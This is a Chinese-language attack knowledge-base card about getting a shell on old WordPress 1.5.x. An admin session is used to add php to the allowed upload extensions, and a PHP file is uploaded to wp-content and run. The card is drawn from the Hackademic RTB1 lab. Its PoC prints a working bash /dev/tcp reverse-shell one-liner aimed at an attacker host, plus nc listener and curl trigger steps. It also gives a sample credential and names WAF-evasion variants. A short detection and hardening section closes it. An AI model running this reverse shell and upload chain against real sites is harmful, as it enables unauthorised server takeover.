---
id: web-generic-file-upload-wordpress-misc-allow-php-extension-upload
title: WordPress 后台 Miscellaneous「Allow File Uploads」+ Allowed file extensions 加 php：管理员会话直接上传 PHP 到 wp-content 执行
type: scenario
domain: web
path: web/generic/file-upload
technique: cms-admin-upload-extension-config-php
tags:
- wordpress
- file-upload
- php
- cms
- webshell
- misconfiguration
- reverse-shell
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W3
  verified_at: '2026-11-08T13:27:10+08:00'
  notes: 已对照原文与图30/31/34/37核对：后台 Options→Miscellaneous 勾选 Allow File Uploads、Allowed file extensions 由 jpg jpeg gif png 改为含 php、Destination directory=/var/www/html/Hackademic_RTB1/wp-content、URI of this directory=/Hackademic_RTB1/wp-content、Upload 页面上传 bin.php（exec 反弹 bash 的最小马）、nc -lvp 4444 后请求 /Hackademic_RTB1/wp-content/bin.php 拿到 apache shell，均与原文一致。核对时把 affected_versions 从 1.5.1.1 清除：原文只说明靶场是 WP 1.5.1.1，属目标环境版本，未标注受影响区间（本卡本质是后台配置面而非版本漏洞）。未验证点：未复跑上传；原文未给 CVE。
url: /docs/web/generic/file-upload/web-generic-file-upload-wordpress-misc-allow-php-extension-upload/
draft: false
kb_aliases:
- WP 后台允许上传 php
- Allow File Uploads 上传配置
- wp-content 上传 PHP 木马
- 后台上传设置 getshell
- WordPress 上传反弹 shell
---

## 一句话结论

老版本 WordPress 的 Options → Miscellaneous 里有「Allow File Uploads」开关与「Allowed file extensions」文本框，默认只允许 `jpg jpeg gif png`；但该设置本身就是后台管理员可改的配置 —— 一旦攻击者拿到管理员会话（弱口令/SQL 注入拖库后破解），把 `php` 追加进允许列表、勾选允许上传，就能在 Upload 页面把一句话木马直接传进 `wp-content/` 目录并以 Web 身份执行，从而反弹 shell。

## 原理

- WP 的文件上传不是靠"服务端硬编码白名单"，而是读后台配置：`Allow File Uploads` 决定是否开放 `wp-content/` 上传，`Allowed file extensions`（空格分隔的扩展名串）决定哪些后缀放行。这个文本框是**管理员可写**的，因此"能不能传 php"完全取决于当前账号权限 —— 管理员账号天然拥有把 php 加进白名单的能力。
- 上传落点是 `Destination directory`（示例 `/var/www/html/<app>/wp-content`），对应 URL 为 `URI of this directory`（示例 `/Hackademic_RTB1/wp-content`）。落盘后文件可由 Web 服务器直接访问，PHP 后缀会被解析执行，等于把一个可控脚本放进 web 根目录。
- 因此这条链的真实门槛不是"绕过后缀校验"，而是"先拿到管理员会话"。上下文里的切入点通常是：后台弱口令爆破、前台 SQL 注入拖 `wp_users` 后破解 MD5、插件漏洞重置口令等。
- 木马用 `<?php exec("/bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1"); ?>` 这类最小落点，请求该 URL 即以 Web 用户（如 `apache`）身份反弹交互 shell；随后做本地信息收集与提权。
- 老版本（1.5.x）的上传实现没有现代的 MIME 二次校验、`wp_check_filetype_and_ext`、随机化文件名等保护，改配置 + 传 php 就能用；现代版本即使管理员也无法把 php 加入允许列表（被 `wp_check_filetype_and_ext` 与 `upload_mimes` 过滤覆盖）。

## 触发条件

- 已获得 WordPress 管理员权限（弱口令、注入拖库后破解、插件后门等）。
- 目标为老版本 WP（如 1.5.x），上传白名单由后台配置项决定、无额外的服务端后缀硬校验。
- `wp-content` 目录对 Web 进程可写，Web 服务器按后缀解析 PHP。
- 服务器允许出站连接（反弹 shell 需要能连回攻击机），或改用正向 webshell 管理工具。

## 利用步骤

1. 登录后台（示例 `GeorgeMiller:q1w2e3`，来自前台注入拖出的 `wp_users` 与 MD5 破解），确认账号可访问 Options。
2. 进入 `Options → Miscellaneous`：勾选 `Allow File Uploads`，把 `Allowed file extensions` 从 `jpg jpeg gif png` 改成 `jpg jpeg gif png php`。
3. 记下 `Destination directory` 与 `URI of this directory`（决定木马落盘路径与访问 URL）。
4. 在 `Upload` 页面上传 `bin.php`，内容为执行反弹 shell 的最小 PHP；上传成功后从返回信息或目录推测文件 URL（`<URI>/bin.php`）。
5. 攻击机 `nc -lvp <port>` 监听，浏览器/curl 请求该 PHP URL，拿到 `apache`/`www-data` 身份 shell。
6. 在该 shell 内做 `uname -a`、`sudo -l`、SUID 枚举与内核 EXP 筛选（另见关联卡），继续提权到 root。

## PoC

```php
<?php exec("/bin/bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1"); ?>
```

```text
# 1) 后台：Options -> Miscellaneous
#    [x] Allow File Uploads
#    Allowed file extensions: jpg jpeg gif png php
#    Destination directory: /var/www/html/<app>/wp-content
#    URI of this directory: /<app>/wp-content
#
# 2) Upload 页面上传 bin.php
# 3) 攻击机监听
nc -lvp 4444
# 4) 请求木马
curl 'http://<target>/<app>/wp-content/bin.php'
# 5) 得到 shell
#    bash: no job control in this shell
#    bash-4.0$ whoami   ->  apache
```

## 变体与关联

- 变体：不放开 php 后缀时，可走后台「主题/插件编辑器」直接改 `.php` 文件写代码（不需上传功能），见关联卡。
- 变体：上传被 WAF 拦 `exec`/`system` 时，改用 `chr()` 拼函数名、`$_POST` 动态调用、加密一句话等免杀写法。
- 变体：落点改为 `.htaccess` 或图片马 + 本地文件包含组合（`jpg` 白名单 + LFI 解析）；或改 `Destination directory` 指向其它可写目录。
- 关联：[[web-php-wordpress-admin-weak-password-theme-editor-rce]]（同一后台权限下的另一条 getshell 路径，不需上传）；[[web-generic-sqli-wordpress-151-cat-union-dump-wp-users]]（前置：前台注入拖 `wp_users` 拿到管理员口令）；[[web-generic-file-upload-upload-allow-param-whitelist-bypass]]（"白名单由请求参数决定"的同族根因）。
- 边界：现代 WP 有 `upload_mimes` 过滤与 `wp_check_filetype_and_ext`，管理员也无法传 php；`wp-content` 不可写或 Web 不解析 php 后缀时失效；只读文件系统/容器镜像同样阻断。

## 检测与防御

- 检测：后台 `options` 表中 `upload_path`/`upload_url_path` 与 `upload_mimes` 的变更；`wp-content/` 下新增 `.php` 文件；新上传文件随即被 HTTP 访问并引发出站连接（Sysmon/防火墙可见 `apache` 进程发起反向连接）。
- 检测：Web 访问日志中 `wp-content/*.php` 的直接请求（正常主题/插件文件很少被这样直接访问）。
- 修复：升级到受支持版本；把上传白名单与解析配置放到服务端硬编码（不依赖后台可改选项）；`wp-content` 目录禁止执行 PHP（nginx `location ~ \.php$` 限定，或 Apache 用 `<Directory>` 禁 `php`）。
- 加固：后台强制强口令 + 二次验证 + 登录频控；限制管理员账号数量并审计 `wp_users`；WAF/文件完整性监控盯 `wp-content` 新增 PHP。
- 响应：清除上传木马、检查是否新增管理员、排查反弹 shell 的出站连接与后续提权痕迹。

## 备注

原文目标 WP 版本 1.5.1.1（后台 Options 页与 `wp-login.php` 均为该版本界面），但这只是该靶场的目标环境版本，原文未标注受影响区间；本卡本质是后台配置面（管理员可改的白名单）而非版本漏洞，故不填写 affected_versions。原文未给 CVE（这是配置面 + 后台权限问题，不是单一编号漏洞）。卡内未写入来源 URL/文章 ID/作者，IP 与口令已泛化/以原文示例值保留在文字说明中（口令本身不作为卡内容主体）。
